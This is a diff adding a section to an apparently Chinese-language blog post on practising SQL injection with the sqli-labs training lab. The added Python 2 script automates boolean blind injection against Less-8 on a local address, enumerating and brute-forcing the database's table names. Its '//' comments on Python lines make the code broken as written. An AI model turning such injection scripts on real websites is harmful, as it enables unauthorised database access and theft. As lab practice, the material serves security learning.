@@ -415,6 +415,67 @@ for x in range(1,7):
 
 有空做个完整的试试。
 
+<code>update 2016/4/27 </code>
+
+自动化blind injection 猜测出当前数据库所有的表名。
+{% highlight python %}
+# -*- coding: utf-8 -*-
+import requests
+
+
+url1 = "http://192.168.1.106/sqli-labs/Less-8/?id=1' and (select count(*) from information_schema.tables where table_schema=database())=%d --+"  
+
+count = 0
+
+for x in range(1,100): // 判断当前数据库有多少表
+	test_url = url1 % (x)
+	r = requests.get(test_url)
+	if "You are in" in r.content:
+		count = x
+		break
+
+print count,"tables"
+
+for c in range(0,count):
+	url="http://192.168.1.106/sqli-labs/Less-8/?id=1' and (select substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))='%s' --+"
+	
+	url2="http://192.168.1.106/sqli-labs/Less-8/?id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1 )=%d --+"
+
+	length =0
+	for l in range(1,100): //判断表名的长度
+		test_url=url2 % (c,l)
+		r = requests.get(test_url)
+		
+		if "You are in" in r.content:
+			length = l		
+			break	
+
+	print "the table name length:",length
+
+	result = ""
+	for x in range(1,length+1): //盲注表名的内容
+		flag=True
+		for i in range(ord('a'),ord('z')+1):
+			if(flag == False):
+				break
+			test_url = url % (c,x,chr(i))
+			r = requests.get(test_url)
+			if "You are in" in r.content:
+				result = result + chr(i)
+				flag = False
+		for i in range(ord('A'),ord('Z')+1):
+			if(flag == False):
+				break
+			test_url = url % (c,x,chr(i))
+			r = requests.get(test_url)
+			if "You are in" in r.content:
+				result = result + chr(i)
+				flag = False
+	print result
+{% endhighlight%}
+
+<img src="/images/sql_12.png">
+
 <code>...待续</code>
 
 EOF
